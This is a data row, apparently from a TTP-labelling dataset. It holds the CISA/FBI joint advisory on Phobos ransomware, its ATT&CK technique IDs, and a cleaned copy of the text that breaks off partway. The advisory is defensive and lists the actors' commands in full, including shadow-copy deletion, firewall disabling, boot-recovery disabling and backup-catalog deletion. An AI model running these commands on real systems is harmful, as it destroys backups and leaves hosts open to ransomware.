,Unnamed: 0,RawText,TTP,CleanText,ttpxhunter,ttpfshot_sl,ttpfshot_ml,ttpfshot_zs
0,https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-060a,"






Actions to take today to mitigate Phobos ransomware activity:




Secure RDP ports to prevent threat actors from abusing and leveraging RDP tools.
Prioritize remediating known exploited vulnerabilities.
Implement EDR solutions to disrupt threat actor memory allocation techniques.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA, to disseminate known TTPs and IOCs associated with the Phobos ransomware variants observed as recently as February 2024, according to open source reporting. Phobos is structured as a ransomware-as-a-service (RaaS) model. Since May 2019, Phobos ransomware incidents impacting state, local, tribal, and territorial (SLTT) governments have been regularly reported to the MS-ISAC. These incidents targeted municipal and county governments, emergency services, education, public healthcare, and other critical infrastructure entities to successfully ransom several million U.S. dollars.[1],[2]
The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of Phobos ransomware and other ransomware incidents.
Download the PDF version of this report:


AA24-060A #StopRansomware: Phobos Ransomware
(PDF,       678.84 KB
  )


For a downloadable copy of indicators of compromise (IOCs), see:


AA24-060A STIX XML
(XML,       147.73 KB
  )




AA24-060A STIX JSON
(JSON,       119.53 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
According to open source reporting, Phobos ransomware is likely connected to numerous variants (including Elking, Eight, Devos, Backmydata, and Faust ransomware) due to similar TTPs observed in Phobos intrusions. Phobos ransomware operates in conjunction with various open source tools such as Smokeloader, Cobalt Strike, and Bloodhound. These tools are all widely accessible and easy to use in various operating environments, making it (and associated variants) a popular choice for many threat actors.[3],[4]
Reconnaissance and Initial Access
Phobos actors typically gain initial access to vulnerable networks by leveraging phishing campaigns [T1598] to drop hidden payloads or using internet protocol (IP) scanning tools, such as Angry IP Scanner, to search for vulnerable Remote Desktop Protocol (RDP) ports [T1595.001] or by leveraging RDP on Microsoft Windows environments.[5],[6]
Once they discover an exposed RDP service, the actors use open source brute force tools to gain access [T1110]. If Phobos actors gain successful RDP authentication [T1133][T1078] in the targeted environment, they perform open source research to create a victim profile and connect the targeted IP addresses to their associated companies [T1593]. Threat actors leveraging Phobos have notably deployed remote access tools to establish a remote connection within the compromised network [T1219].[7]
Alternatively, threat actors send spoofed email attachments [T1566.001] that are embedded with hidden payloads [T1204.002] such as SmokeLoader, a backdoor trojan that is often used in conjunction with Phobos. After SmokeLoader’s hidden payload is downloaded onto the victim’s system, threat actors use the malware’s functionality to download the Phobos payload and exfiltrate data from the compromised system.
Execution and Privilege Escalation
Phobos actors run executables like 1saas.exe or cmd.exe to deploy additional Phobos payloads that have elevated privileges enabled [TA0004]. Additionally, Phobos actors can use the previous commands to perform various windows shell functions. The Windows command shell enables threat actors to control various aspects of a system, with multiple permission levels required for different subsets of commands [T1059.003][T1105].[8]
Smokeloader Deployment
Phobos operations feature a standard three phase process to decrypt a payload that allows the threat actors to deploy additional destructive malware.[9]
For the first phase, Smokeloader manipulates either VirtualAlloc or VirtualProtect API functions—which opens an entry point, enabling code to be injected into running processes and allowing the malware to evade network defense tools [T1055.002]. In the second phase, a stealth process is used to obfuscate command and control (C2) activity by producing requests to legitimate websites [T1001.003].[10]
Within this phase, the shellcode also sends a call from the entry point to a memory container [T1055.004] and prepares a portable executable for deployment in the final stage [T1027.002][T1105][T1140].
Finally, once Smokeloader reaches its third stage, it unpacks a program-erase cycle from stored memory, which is then sent to be extracted from a SHA 256 hash as a payload.[7] Following successful payload decryption, the threat actors can begin downloading additional malware.
Additional Phobos Defense Evasion Capabilities
Phobos ransomware actors have been observed bypassing organizational network defense protocols by modifying system firewall configurations using commands like netsh firewall set opmode mode=disable [T1562.004]. Additionally, Phobos actors can evade detection by using the following tools: Universal Virus Sniffer, Process Hacker, and PowerTool [T1562].
Persistence and Privilege Escalation
According to open source reporting, Phobos ransomware uses commands such as Exec.exe or the bcdedit[.]exe control mechanism. Phobos has also been observed using Windows Startup folders and Run Registry Keys such as C:/Users\Admin\AppData\Local\directory [T1490][T1547.001] to maintain persistence within compromised environments.[5]
Additionally, Phobos actors have been observed using built-in Windows API functions [T1106] to steal tokens [T1134.001], bypass access controls, and create new processes to escalate privileges by leveraging the SeDebugPrivilege process [T1134.002]. Phobos actors attempt to authenticate using cached password hashes on victim machines until they reach domain administrator access [T1003.005].
Discovery and Credential Access
Phobos actors additionally use open source tools [T1588.002] such as Bloodhound and Sharphound to enumerate the active directory [T1087.002]. Mimikatz and NirSoft, as well as Remote Desktop Passview to export browser client credentials [T1003.001][T1555.003], have also been used. Furthermore, Phobos ransomware is able to enumerate connected storage devices [T1082], running processes [T1057], and encrypt user files [T1083].
Exfiltration
Phobos actors have been observed using WinSCP and Mega.io for file exfiltration.[11] They use WinSCP to connect directly from a victim network to an FTP server [T1071.002] they control [TA0010]. Phobos actors install Mega.io [T1048] and use it to export victim files directly to a cloud storage provider [T1567.002]. Data is typically archived as either a .rar or .zip file [T1560] to be later exfiltrated. They target legal documentation, financial records, technical documents (including network architecture), and databases for commonly used password management software [T1555.005].
Impact
After the exfiltration phase, Phobos actors then hunt for backups. They use vssadmin.exe and Windows Management Instrumentation command-line utility (WMIC) to discover and delete volume shadow copies in Windows environments. This prevents victims from recovering files after encryption has taken place [T1047][T1490].
Phobos.exe contains functionality to encrypt all connected logical drives on the target host [T1486]. Each Phobos ransomware executable has unique build identifiers (IDs), affiliate IDs, as well as a unique ransom note which is embedded in the executable. After the ransom note has populated on infected workstations, Phobos ransomware continues to search for and encrypt additional files.
Most extortion [T1657] occurs via email; however, some affiliate groups have used voice calls to contact victims. In some cases, Phobos actors have used onion sites to list victims and host stolen victim data. Phobos actors use various instant messaging applications such as ICQ, Jabber, and QQ to communicate [T1585]. See Figure 2 for a list of email providers used by the following Phobos affiliates: Devos, Eight, Elbie, Eking, and Faust.[6]

 

Figure 1: Phobos Affiliate Providers List

INDICATORS OF COMPROMISE (IOCs)
See Table 1 through 6 for IOCs obtained from CISA and the FBI investigations from September through November 2023.

Table 1: Associated Phobos Domains


Associated Phobos Domains




adstat477d[.]xyz


demstat577d[.]xyz [12]


serverxlogs21[.]xyz




Table 2: Observed Phobos Shell Commands


Shell Commands




vssadmin delete shadows /all /quiet [T1490]


netsh advfirewall set currentprofile state off


wmic shadowcopy delete


netsh firewall set opmode mode=disable [T1562.004]


bcdedit /set {default} bootstatuspolicy ignoreallfailures [T1547.001]


bcdedit /set {default} recoveryenabled no [T1490]


wbadmin delete catalog -quiet


mshta C:\%USERPROFILE%\Desktop\info.hta [T1218.005]


mshta C:\%PUBLIC%\Desktop\info.hta


mshta C:\info.hta



The commands above are observed during the execution of a Phobos encryption executable. A Phobos encryption executable spawns a cmd.exe process, which then executes the commands listed in Table 1 with their respective Windows system executables. When the commands above are executed on a Windows system, volume shadow copies are deleted and Windows Firewall is disabled. Additionally, the system’s boot status policy is set to boot even when there are errors during the boot process, and automatic recovery options, like Windows Recovery Environment (WinRE), are disabled for the given boot entry. The system’s backup catalog is also deleted. Finally, the Phobos ransom note is displayed to the end user using mshta.exe.

Table 3: Observed Phobos Registry Keys


Registry Keys




HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\<Phobos exe name>


C:/Users\Admin\AppData\Local\directory




Table 4: Observed Phobos Actor Email Addresses


Email Addresses
 




AlbetPattisson1981@protonmail[.]com
henryk@onionmail[.]org


atomicday@tuta[.]io
info@fobos[.]one


axdus@tuta[.]io
it.issues.solving@outlook[.]com


barenuckles@tutanota[.]com
JohnWilliams1887@gmx[.]com


Bernard.bunyan@aol[.]com
jonson_eight@gmx[.]us


bill.g@gmx[.]com
joshuabernandead@gmx[.]com


bill.g@msgsafe[.]io
LettoIntago@onionmail[.]com


bill.g@onionmail[.]org
Luiza.li@tutanota[.]com


bill.gTeam@gmx[.]com
MatheusCosta0194@gmx[.]com


blair_lockyer@aol[.]com
mccreight.ellery@tutanota[.]com


CarlJohnson1948@gmx[.]com
megaport@tuta[.]io


cashonlycash@gmx[.]com
miadowson@tuta[.]io


chocolate_muffin@tutanota[.]com
MichaelWayne1973@tutanota[.]com


claredrinkall@aol[.]com
normanbaker1929@gmx[.]com


clausmeyer070@cock[.]li
nud_satanakia@keemail[.]me


colexpro@keemail[.]me
please@countermail[.]com


cox.barthel@aol[.]com
precorpman@onionmail[.]org


crashonlycash@gmx[.]com
recovery2021@inboxhub[.]net


everymoment@tuta[.]io
recovery2021@onionmail[.]org


expertbox@tuta[.]io
SamuelWhite1821@tutanota[.]com


fastway@tuta[.]io
SaraConor@gmx[.]com


fquatela@techie[.]com
secdatltd@gmx[.]com


fredmoneco@tutanota[.]com
skymix@tuta[.]io


getdata@gmx[.]com
sory@countermail[.]com


greenbookBTC@gmx[.]com
spacegroup@tuta[.]io


greenbookBTC@protonmail[.]com
stafordpalin@protonmail[.]com


helperfiles@gmx[.]com
starcomp@keemail[.]me


helpermail@onionmail[.]org
xdone@tutamail[.]com


helpfiles@onionmail[.]org
xgen@tuta[.]io


helpfiles102030@inboxhub[.]net
xspacegroup@protonmail[.]com


helpforyou@gmx[.]com
zgen@tuta[.]io


helpforyou@onionmail[.]org
zodiacx@tuta[.]io




Table 5: Observed Phobos Actor Telegram Username


Telegram Username




@phobos_support




Table 6: Observed Phobos Actor Wickr Address


Wickr Address






Vickre me





Disclaimer: Organizations are encouraged to investigate the use of the IOCs in Table 7 for related signs of compromise prior to performing remediation actions.

Table 7: Phobos IOCs from September through December 2023


Associated IP Address
File Type
File Name
SHA 256 Hash




194.165.16[.]4 (October 2023)
Win32.exe
Ahpdate.exe [13]
0000599cbc6e5b0633c5a6261c79e4d3d81005c77845c6b0679d854884a8e02f



45.9.74[.]14 (December 2023)
147.78.47[.]224 (December 2023)

Executable and Linkable Format (ELF) [14]

1570442295
(Trojan Linux Mirai)

7451be9b65b956ee667081e1141531514b1ec348e7081b5a9cd1308a98eec8f0


185.202.0[.]111 (September 2023)
Win32.exe [15]
cobaltstrike_shellcode[.]exe (C2 activity)
 


185.202.0[.]111 (December 2023)
.txt [16]
f1425cff3d28afe5245459afa6d7985081bc6a62f86dce64c63daeb2136d7d2c.bin (Trojan)
 



Disclaimer: Organizations are encouraged to investigate the use of the file hashes in Tables 8 and 9 for related signs of compromise prior to performing remediation actions.

Table 8: Phobos Actor File Hashes Observed in October 2023


Phobos Ransomware SHA 256 Malicious Trojan Executable File Hashes




518544e56e8ccee401ffa1b0a01a10ce23e49ec21ec441c6c7c3951b01c1b19c


9215550ce3b164972413a329ab697012e909d543e8ac05d9901095016dd3fc6c


482754d66d01aa3579f007c2b3c3d0591865eb60ba60b9c28c66fe6f4ac53c52


c0539fd02ca0184925a932a9e926c681dc9c81b5de4624250f2dd885ca5c4763




Table 9: Phobos Actor File Hashes from Open Source from November 2023 [17]


Phobos Ransomware SHA 256 File Hashes




58626a9bfb48cd30acd0d95debcaefd188ae794e1e0072c5bde8adae9bccafa6


f3be35f8b8301e39dd3dffc9325553516a085c12dc15494a5e2fce73c77069ed


518544e56e8ccee401ffa1b0a01a10ce23e49ec21ec441c6c7c3951b01c1b19c


32a674b59c3f9a45efde48368b4de7e0e76c19e06b2f18afb6638d1a080b2eb3


2704e269fb5cf9a02070a0ea07d82dc9d87f2cb95e60cb71d6c6d38b01869f66


fc4b14250db7f66107820ecc56026e6be3e8e0eb2d428719156cf1c53ae139c6


a91491f45b851a07f91ba5a200967921bf796d38677786de51a4a8fe5ddeafd2



MITRE ATT&CK TECHNIQUES
See Table 10 through 22 for all threat actor tactics and techniques referenced in this advisory.

Table 10: Phobos Threat Actors ATT&CK Techniques for Enterprise – Reconnaissance


Technique Title
ID
Use




Search Open Websites/Domains
T1593
Phobos actors perform open source research to find information about victims that can be used during targeting to create a victim profile.


Scanning IP Blocks
T1595.001
Phobos actors used IP scanning tools to include Angry IP Scanner to search for vulnerable RDP ports.


Phishing for Information
T1598
Phobos actors use phishing campaigns to social engineer information from users and gain access to vulnerable RDP ports.




Table 11: Phobos Threat Actors ATT&CK Techniques for Enterprise – Resource Development


Technique Title
ID
Use




Establish Accounts
T1585
Phobos actors establish accounts to communicate.


Obtain Capabilities: Tool
T1588.002
Phobos actors used open source tools in their attack.




Table 12: Phobos Threat Actors ATT&CK Techniques for Enterprise – Initial Access


Technique Title
ID
Use




Valid Accounts
T1078
Following successful RDP authentication, Phobos actors search for IP addresses and pair them with their associated computer to create a victim profile.


External Remote Services
T1133
Phobos actors may leverage external-facing remote services to initially access and/or persist within a network.


Phishing: Spearphishing Attachment
T1566.001
Phobos actors used a spoofed email attachment to execute attack.




Table 13: Phobos Threat Actors ATT&CK Techniques for Enterprise – Execution


Technique Title
ID
Use




Windows Management Instrumentation
T1047
Phobos actors used Windows Management Instrumentation command-line utility (WMIC) to prevent victims from recovering files.


Windows Command Shell
T1059.003
Phobos actors can use the previous commands to perform commands with windows shell functions.


Native API
T1106
Phobos actors used open source tools to enumerate the active directory.


Malicious File
T1204.002
Phobos actors attached a malicious email attachment to deliver ransomware.




Table 14: Phobos Threat Actors ATT&CK Techniques for Enterprise – Persistence


Technique Title
ID
Use




Registry Run Keys / Startup Folder
T1547.001
Phobos ransomware operates using the Exec.exe control mechanism and has been observed using Windows Startup folders and Run Registry Keys.




Table 15: Phobos Threat Actors ATT&CK Techniques for Enterprise – Privilege Escalation


Technique Title
ID
Use




Privilege Escalation
TA0004
Phobos actors use run commands like 1saas.exe, or cmd.exe to deploy additional Phobos payloads with escalated privileges.


Portable Executable Injection
T1055.002
Phobos actors use Smokeloader to inject code into running processes to identify an entry point through enabling a VirtualAlloc or VirtualProtect process.


Asynchronous Procedure Call
T1055.004
During phase two of execution, Phobos ransomware sends a call back from an identified entry point.


Access Token Manipulation: Token Impersonation/Theft
T1134.001
Phobos actors can use Windows API functions to steal tokens.


Create Process with Token
T1134.002
Phobos actors used Windows API functions to steal tokens, bypass access controls and create new processes.




Table 16: Phobos Threat Actors ATT&CK Techniques for Enterprise – Defense Evasion


Technique Title
ID
Use




Software Packing
T1027.002
Phobos actors deployed a portable executable (PE) to conceal code.


Embedded Payloads
T1027.009
Phobos actors embedded the ransomware as a hidden payload by using Smokeloader.


Deobfuscate/Decode Files or Information
T1140
During phase two of execution, Phobos actors’ malware stores and decrypts information.


System Binary Proxy Execution: Mshta
T1218.005
Phobos actors used Mshta to execute malicious files.


Impair Defenses
T1562
Phobos actors can use Universal Virus Sniffer, Process Hacker, and PowerTool to evade detection.


Disable or Modify System Firewall
T1562.004
Phobos ransomware has been observed bypassing organizational network defense protocols through modifying system firewall configurations.




Table 17: Phobos Threat Actors ATT&CK Techniques for Enterprise – Credential Access


Technique Title
ID
Use




OS Credential Dumping: LSASS Memory
T1003.001
Phobos actors used Mimikatz to export credentials.


OS Credential Dumping: Cached Domain Credentials
T1003.005
Phobos actors use cached domain credentials to authenticate as the domain administrator in the event a domain controller is unavailable.


Brute Force
T1110
Phobos actors may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.


Credentials from Password Stores
T1555
Phobos actors may search for common password storage locations to obtain user credentials.


Credentials from Password Stores: Credentials from Web Browsers
T1555.003

Phobos actors use Nirsoft or Passview to export client credentials from web browsers.
Phobos actors search for stored credentials in browser clients once they gain initial network access.



Credentials from Password Stores: Password Managers
T1555.005
Phobos actors targeted victim’s databases for password management software.




Table 18: Phobos Threat Actors ATT&CK Techniques for Enterprise – Discovery


Technique Title
ID
Use




Process Discovery
T1057
Phobos ransomware is able to run processes.


System Information Discovery
T1082
Phobos ransomware is able to enumerate connected storage devices.


File and Directory Discovery
T1083
Phobos ransomware can encrypt user files.


Domain Account
T1087.002
Phobos threat actor used Bloodhound and Sharphound to enumerate the active directory.




Table 19: Phobos Threat Actors ATT&CK Techniques for Enterprise – Collection


Technique Title
ID
Use




Archive Collected Data
T1560
Phobos threat actors archive data as either a .rar or .zip file to be later exfiltrated.




Table 20: Phobos Threat Actors ATT&CK Techniques for Enterprise – Command and Control


Technique Title
ID
Use




Data Obfuscation: Protocol Impersonation
T1001.003
Phobos actors used a stealth process to obfuscate C2 activity.


File Transfer Protocols
T1071.002
Phobos threat actors used WinSCP to connect the victim’s network to an FTP server.


Ingress Tool Transfer
T1105
Phobos ransomware extracts its final payload from the hashed file.


Remote Access Software
T1219
Phobos threat actors used remote access tools to establish a remote connection within victim’s network.




Table 21: Phobos Threat Actors ATT&CK Techniques for Enterprise – Exfiltration


Technique Title
ID
Use




Exfiltration
TA0010
Phobos threat actors may use exfiltration techniques to steal data from your network.


Exfiltration Over Alternative Protocol
T1048
Phobos threat actors use software to export files to a cloud.


Exfiltration to Cloud Storage
T1567.002
Phobos threat actors use Mega.io to exfiltrate data to a cloud storage service rather than over their primary command and control channel.




Table 22: Phobos Threat Actors ATT&CK Techniques for Enterprise – Impact


Technique Title
ID
Use




Data Encrypted for Impact
T1486
Phobos threat actors use the Phobos.exe command to encrypt data on all logical drives connected to the network.


Inhibit System Recovery
T1490
Phobos threat actors may delete or remove backups to include volume shadow copies from Windows environments to prevent victim data recovery response efforts.


Financial Theft
T1657
Phobos threat actor’s extort victims for financial gain.



MITIGATIONS
Secure by Design and Default Mitigations:
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI, CISA, and MS-ISAC recommend that software manufacturers incorporate secure by design and default principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the secure posture for their customers.
For more information on secure by design, see CISA’s Secure by Design webpage and joint guide.
The FBI, CISA, and MS-ISAC recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture against actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Secure remote access software by applying recommendations from the joint Guide to Securing Remote Access Software.
Implement application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlist solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Implement log collection best practices and use intrusion detection systems to defend against threat actors manipulating firewall configurations through early detection [CPG 2.T].

Implement EDR solutions to disrupt threat actor memory allocation techniques.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions [CPG 2.N].
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts [CPG 4.C].
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP) [CPG 2.E].
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts at the admin level and higher [CPG 2.A, 2.E].

In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, or the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices [CPG 2.R].
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters and no more than 64 characters in length [CPG 2.B].
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems [CPG 2.H].
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic and activity, including lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [CPG 3.A].
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports and protocols [CPG 2.V].
Consider adding an email banner to emails received from outside your organization [CPG 2.M].
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R].

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI, CISA, and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and MS-ISAC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 4-16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI, CISA, and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA, NSA, FBI, and Multi-State Information Sharing and Analysis Center’s (MS-ISAC) Joint #StopRansomware Guide.
SLTT organizations are encouraged to implement MS-ISAC’s Ransomware Defense-in-Depth guidance.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.
CISA: Known Exploited Vulnerabilities Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design
CISA: Implementing Phishing-Resistant MFA
CISA: Guide to Securing Remote Access Software

REFERENCES
[1] Privacy Affairs: “Moral” 8Base Ransomware Targets 2 New Victims[2] VMware: 8base ransomware: A Heavy Hitting Player[3] Infosecurity Magazine: Phobos Ransomware Family Expands With New FAUST Variant[4] The Record: Hospitals offline across Romania following ransomware attack on IT platform[5] Comparitech: What is Phobos Ransomware & How to Protect Against It?[6] Cisco Talos: Understanding the Phobos affiliate structure and activity[7] Cisco Talos: A deep dive into Phobos ransomware, recently deployed by 8Base group[8] Malwarebytes Labs: A deep dive into Phobos ransomware[9] Any Run: Smokeloader[10] Malpedia: Smokeloader[11] Truesec: A case of the FAUST Ransomware[12] VirusTotal: Phobos Domain #1[13] VirusTotal: Phobos executable: Ahpdate.exe[14] VirusTotal: Phobos GUI extension: ELF File[15] VirusTotal: Phobos IP address: 185.202.0[.]111[16] VirusTotal: Phobos GUI extension: Binary File[17] Cisco Talos GitHub: IOCs/2023/11/deep-dive-into-phobos-ransomware.txt at main
REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom-note, communications with Phobos actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
Additional details requested include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host and network-based indicators.
The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3), a local FBI Field Office, or to CISA at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
DISCLAIMER
The FBI does not conduct its investigative activities or base attribution solely on activities protected by the First Amendment. Your company has no obligation to respond or provide information back to the FBI in response to this engagement. If, after reviewing the information, your company decides to provide referral information to the FBI, it must do so in a manner consistent with federal law. The FBI does not request or expect your company to take any particular action regarding this information other than holding it in confidence due to its sensitive nature.
The information in this report is being provided “as is” for informational purposes only. The FBI and CISA not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise does not constitute or imply endorsement, recommendation, or favoring by CISA, the FBI, and the MS-ISAC.
ACKNOWLEDGEMENTS
The California Joint Regional Intelligence Center (JRIC, CA) and Israel National Cyber Directorate (INCD) contributed to this CSA.
VERSION HISTORY
February 29, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1083', 'T1071.002', 'T1055.004', 'T1657', 'T1055.002', 'T1219', 'T1490', 'T1588.002', 'TA0010', 'T1027.009', 'T1593', 'T1134.001', 'T1560', 'T1204.002', 'T1555', 'T1562', 'T1087.002', 'T1110', 'T1003.005', 'T1105', 'T1003.001', 'T1082', 'T1567.002', 'T1140', 'T1218.005', 'T1134.002', 'T1595.001', 'T1078', 'T1001.003', 'T1057', 'T1566.001', 'T1555.005', 'T1133', 'T1027.002', 'T1547.001', 'T1598', 'T1486', 'TA0004', 'T1047', 'T1106', 'T1059.003', 'T1585', 'T1555.003', 'T1048', 'T1562.004'}","






Actions to take today to mitigate Phobos ransomware activity:




Secure RDP ports to prevent threat actors from abusing and leveraging RDP tools.
Prioritize remediating known exploited vulnerabilities.
Implement EDR solutions to disrupt threat actor memory allocation techniques.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA, to disseminate known TTPs and IOCs associated with the Phobos ransomware variants observed as recently as February 2024, according to open source reporting. Phobos is structured as a ransomware-as-a-service (RaaS) model. Since May 2019, Phobos ransomware incidents impacting state, local, tribal, and territorial (SLTT) governments have been regularly reported to the MS-ISAC. These incidents targeted municipal and county governments, emergency services, education, public healthcare, and other critical infrastructure entities to successfully ransom several million U.S. dollars.,1,2,
The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of Phobos ransomware and other ransomware incidents.
Download the PDF version of this report:


AA24-060A #StopRansomware: Phobos Ransomware
(PDF,       678.84 KB
  )


For a downloadable copy of indicators of compromise (IOCs), see:


AA24-060A STIX XML
(XML,       147.73 KB
  )




AA24-060A STIX JSON
(JSON,       119.53 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
According to open source reporting, Phobos ransomware is likely connected to numerous variants (including Elking, Eight, Devos, Backmydata, and Faust ransomware) due to similar TTPs observed in Phobos intrusions. Phobos ransomware operates in conjunction with various open source tools such as Smokeloader, Cobalt Strike, and Bloodhound. These tools are all widely accessible and easy to use in various operating environments, making it (and associated variants) a popular choice for many threat actors.,3,4,
Reconnaissance and Initial Access
Phobos actors typically gain initial access to vulnerable networks by leveraging phishing campaigns, to drop hidden payloads or using internet protocol (IP) scanning tools, such as Angry IP Scanner, to search for vulnerable Remote Desktop Protocol (RDP) ports, or by leveraging RDP on Microsoft Windows environments.,5,6,
Once they discover an exposed RDP service, the actors use open source brute force tools to gain access,. If Phobos actors gain successful RDP authentication, in the targeted environment, they perform open source research to create a victim profile and connect the targeted IP addresses to their associated companies,. Threat actors leveraging Phobos have notably deployed remote access tools to establish a remote connection within the compromised network,.,7,
Alternatively, threat actors send spoofed email attachments, that are embedded with hidden payloads, such as SmokeLoader, a backdoor trojan that is often used in conjunction with Phobos. After SmokeLoader’s hidden payload is downloaded onto the victim’s system, threat actors use the malware’s functionality to download the Phobos payload and exfiltrate data from the compromised system.
Execution and Privilege Escalation
